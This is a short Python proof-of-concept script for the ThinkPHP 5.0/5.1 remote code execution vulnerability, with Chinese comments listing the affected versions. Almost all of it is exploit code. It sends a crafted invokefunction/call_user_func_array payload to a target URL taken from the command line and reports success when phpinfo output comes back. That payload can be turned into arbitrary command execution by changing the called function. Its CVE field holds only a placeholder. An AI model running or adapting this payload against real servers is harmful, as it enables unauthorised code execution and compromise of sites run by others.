#coding=utf-8
#https://www.exploit-db.com/exploits/45978
'''
影响版本：
ThinkPHP 5.0.5-5.0.22
ThinkPHP 5.1.0-5.1.30
修复方案：
升级
'''
import requests, sys
from bs4 import BeautifulSoup
class ThinkPHP5_RCE():
    def __init__(self):
        self.url = sys.argv[1]
        self.vul_name = 'ThinkPHP远程代码执行'
        self.CVE_no = 'CVE_a'
        self.payload = "/?s=/admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    def print_info(self):
        print("[+]漏洞名称: " + self.vul_name)
        print("[+]漏洞CVE: " + self.CVE_no)
        print("[+]payload: " + self.url + self.payload)    
    def run(self):          
        res = requests.get(self.url+self.payload)
        if res.text.find("PHP Version") > 0:
            self.print_info()
        #print("[+]"+requests.get(self.url+self.payload).text)        
def main():
    thinkPHP5_RCE = ThinkPHP5_RCE()   
    thinkPHP5_RCE.run()    
if __name__ == '__main__':
    main()   